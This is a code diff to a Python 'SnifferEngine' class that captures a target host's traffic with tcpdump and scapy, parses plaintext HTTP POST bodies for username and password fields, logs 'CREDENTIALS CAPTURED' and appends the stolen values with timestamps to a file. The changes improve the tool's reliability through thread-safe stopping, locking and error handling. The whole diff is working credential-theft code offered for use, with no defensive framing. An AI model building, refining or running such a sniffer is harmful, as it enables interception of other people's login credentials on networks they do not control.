@@ -15,7 +15,8 @@ class SnifferEngine:
         self.on_credential = on_credential
         self.on_traffic = on_traffic
         self.on_packet = on_packet
-        self.running = False
+        
+        self.stop_event = threading.Event()
         self.thread = None
         self.tcpdump_proc = None
         
@@ -26,10 +27,10 @@ class SnifferEngine:
 
         self.rx_bytes = 0
         self.tx_bytes = 0
+        self.byte_lock = threading.Lock()
 
     def start(self):
-        self.running = True
-        
+        self.stop_event.clear()
         self.tcpdump_proc = subprocess.Popen(
             ["tcpdump", "-i", self.interface, "-w", self.pcap_path, f"host {self.target_ip}", "-U"],
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
@@ -43,27 +44,38 @@ class SnifferEngine:
         self.traffic_thread.start()
 
     def stop(self):
-        self.running = False
+        self.stop_event.set()
         if self.tcpdump_proc:
             self.tcpdump_proc.terminate()
             self.tcpdump_proc.wait()
+        if self.thread and self.thread.is_alive():
+            self.thread.join(timeout=2)
         self.on_log(f"[!] Sniffer stopped. Logs saved in {self.log_dir}")
 
     def _traffic_loop(self):
-        while self.running:
-            time.sleep(1)
-            rx_kb = round(self.rx_bytes / 1024, 1)
-            tx_kb = round(self.tx_bytes / 1024, 1)
+        while not self.stop_event.is_set():
+            if self.stop_event.wait(1.0):
+                break
+                
+            with self.byte_lock:
+                rx_kb = round(self.rx_bytes / 1024, 1)
+                tx_kb = round(self.tx_bytes / 1024, 1)
+                self.rx_bytes = 0
+                self.tx_bytes = 0
             self.on_traffic(rx_kb, tx_kb)
-            self.rx_bytes = 0
-            self.tx_bytes = 0
 
     def _sniff_loop(self):
         bpf_filter = f"host {self.target_ip}"
-        sniff(iface=self.interface, filter=bpf_filter, prn=self._process_packet, store=False, stop_filter=lambda x: not self.running)
+        sniff(
+            iface=self.interface, 
+            filter=bpf_filter, 
+            prn=self._process_packet, 
+            store=False, 
+            stop_filter=lambda x: self.stop_event.is_set()
+        )
 
     def _process_packet(self, packet):
-        if not self.running:
+        if self.stop_event.is_set():
             return
 
         if packet.haslayer(IP):
@@ -71,10 +83,11 @@ class SnifferEngine:
             src_ip = packet[IP].src
             dst_ip = packet[IP].dst
             
-            if dst_ip == self.target_ip:
-                self.rx_bytes += pkt_len
-            elif src_ip == self.target_ip:
-                self.tx_bytes += pkt_len
+            with self.byte_lock:
+                if dst_ip == self.target_ip:
+                    self.rx_bytes += pkt_len
+                elif src_ip == self.target_ip:
+                    self.tx_bytes += pkt_len
 
             proto = "IP"
             src_port = ""
@@ -93,13 +106,10 @@ class SnifferEngine:
             elif packet.haslayer(ICMP):
                 proto = "ICMP"
                 
-            summary = f"[{proto}] {src_ip}{src_port} -> {dst_ip}{dst_port} ({pkt_len}B)"
-            self.on_log(summary)
-
             pkt_data = {
                 "id": str(uuid.uuid4()),
                 "type": proto,
-                "summary": summary,
+                "summary": f"[{proto}] {src_ip}{src_port} -> {dst_ip}{dst_port} ({pkt_len}B)",
                 "src_ip": src_ip,
                 "dst_ip": dst_ip,
                 "src_port": src_port.replace(":", ""),
@@ -128,7 +138,7 @@ class SnifferEngine:
                 payload = packet[Raw].load.decode('utf-8', errors='ignore')
                 if "POST" in payload and ("pass" in payload.lower() or "user" in payload.lower() or "login" in payload.lower()):
                     self._extract_credentials(payload)
-            except:
+            except Exception as e:
                 pass
 
     def _extract_credentials(self, payload):
@@ -142,5 +152,8 @@ class SnifferEngine:
             cred_str = "\n".join(creds)
             self.on_log(f"[!] CREDENTIALS CAPTURED: {cred_str}")
             self.on_credential(cred_str)
-            with open(self.cred_path, "a") as f:
-                f.write(f"--- Captured ---\n{cred_str}\n\n")
+            try:
+                with open(self.cred_path, "a") as f:
+                    f.write(f"--- Captured {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n{cred_str}\n\n")
+            except Exception as e:
+                self.on_log(f"[-] Error saving credentials: {e}")
